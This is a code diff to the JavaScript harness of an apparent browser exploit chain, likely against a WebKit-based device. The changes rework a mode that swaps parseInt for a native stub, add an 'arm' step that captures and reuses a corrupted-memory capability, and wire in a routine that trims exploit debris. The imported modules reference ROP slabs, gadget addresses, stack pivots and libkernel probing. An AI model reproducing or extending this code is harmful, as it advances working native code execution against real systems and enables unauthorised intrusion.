@@ -73,7 +73,7 @@ import {
 import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
 import { createCrashLog } from "./log_persist.js";
 import { fireCoreGetpid, fireCoreNotify, bisectCoreTriggerLite } from "./core_native.js?v=core-6";
-import { fireStubSwapParseInt, fireCollatorStub, pinCollatorStub, STUB_LAST_STEP_KEY } from "./stub_call.js?v=stub-4";
+import { fireStubSwapParseInt, fireCollatorStub, pinCollatorStub, STUB_LAST_STEP_KEY } from "./stub_call.js?v=stub-5";
 import { prepNativeChain, stageGetpid, stageUsleep, stageNotify, fireNativeCall, fireUsleep, fireNotify, firePivotSmoke,
     resolvePivotBuiltin, firePivotTrigger,
     firePivotGetpid,
@@ -91,7 +91,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, stageNotify, fireNativeCall,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js?v=nc-20250831r";
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250901c";
+const BUILD_ID = "rw-20250901d";
 
 function usePoopsNativePath() {
     return params.get("nativepath") === "poops";
@@ -5507,11 +5507,21 @@ function runFireGetpid() {
         };
         const stubOpts = {
             carrier: window._wkCarrier,
-            stubKind: params.get("stubkind") || "all",
+            stubKind: params.get("stubkind") || "syscall",
+            useTextarea: params.get("arg") === "ta",
+            reuseCap: (params.get("stubarm") === "1" || params.get("stubmode") === "arm")
+                ? false : (window._stubCap || true),
             log: stubLog,
             flush: stubFlush,
+            preTrim: function () {
+                try {
+                    const core = window.__wkCoreTrim;
+                    if (core) core();
+                } catch (_) { }
+            },
         };
-        mark("STUB-FIRE", "direct stub — NO ROP slab build=" + BUILD_ID);
+        mark("STUB-FIRE", "direct stub — NO ROP slab build=" + BUILD_ID
+            + (stubOpts.reuseCap === false ? " (arm)" : " parseInt(1)"));
         stubFlush();
         try {
             if (params.get("stubmode") === "collator") {
@@ -5522,8 +5532,9 @@ function runFireGetpid() {
                 state("collator stub fired", "ok");
             } else if (params.get("stubmode") === "arm" || params.get("stubarm") === "1") {
                 const r = fireStubSwapParseInt(p, off, lk, Object.assign({}, stubOpts, { armOnly: true }));
-                mark("STUB-ARM-OK", r.stubTag + " mainMf=" + r.mainMf);
-                state("stub arm OK", "ok");
+                window._stubCap = { mainMf: r.mainMf, mainOrig: r.mainOrig, path: "armed" };
+                mark("STUB-ARM-OK", r.stubTag + " mainMf=" + r.mainMf + " — parseInt restored, safe to reload");
+                state("stub arm OK — remove ?stubarm=1 then Fire", "ok");
             } else {
                 const r = fireStubSwapParseInt(p, off, lk, stubOpts);
                 mark("STUB-OK", r.stubTag + " jsResult=" + r.result + " arg=" + r.fireArg);
@@ -5851,10 +5862,14 @@ async function runStart() {
             },
         });
         window._wkCarrier = carrier;
-        if (carrier && !carrier.native) {
-            const nat = (await import("./core.js?v=" + BUILD_ID)).getCoreNative(carrier);
-            if (nat) carrier.native = nat;
-        }
+        try {
+            const coreMod = await import("./core.js?v=" + BUILD_ID);
+            window.__wkCoreTrim = coreMod.trimExploitDebris;
+            if (carrier && !carrier.native) {
+                const nat = coreMod.getCoreNative(carrier);
+                if (nat) carrier.native = nat;
+            }
+        } catch (_) { }
         const p = window.p;
         if (!p) throw new Error("window.p missing");
         saveTextareaSession(p, carrier);
@@ -6317,7 +6332,7 @@ function init() {
     mark("BOOT", "LK-PROBE line shows dynamic parse status");
     mark("BOOT", groomBootLine(params));
     if (useStubNativePath())
-        mark("BOOT", "stub path — Fire logs STUB-*; arm first (?stubarm=1); reload shows STUB-LAST-STEP");
+        mark("BOOT", "stub: Arm restores parseInt (?stubarm=1) — Fire w/o stubarm uses parseInt(1) + syscall");
     replayHuntTrace();
     window.addEventListener("beforeunload", function () {
         stopPivotScanQuiet();
